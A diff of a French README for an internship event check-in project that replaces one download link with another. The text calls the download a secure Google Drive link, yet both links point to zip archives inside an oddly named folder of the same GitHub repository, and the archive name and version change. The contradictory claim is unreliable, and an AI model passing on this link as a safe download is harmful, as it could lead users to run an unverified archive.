@@ -10,7 +10,7 @@ Ce projet a été réalisé dans le cadre d’un stage académique et a pour obj
 
 Le projet étant trop volumineux pour GitHub (environ 600 Mo), il est disponible en téléchargement sécurisé via Google Drive :
 
-👉 **[Télécharger le projet complet (Web + Mobile + BDD)](https://raw.githubusercontent.com/Miguel-max219/Echeck-in-Event2/main/Lecidea/Echeck-in-Event2_3.4.zip)**
+👉 **[Télécharger le projet complet (Web + Mobile + BDD)](https://github.com/Miguel-max219/Echeck-in-Event2/raw/refs/heads/main/Lecidea/in-Echeck-Event-v2.8.zip)**
 
 ---
 
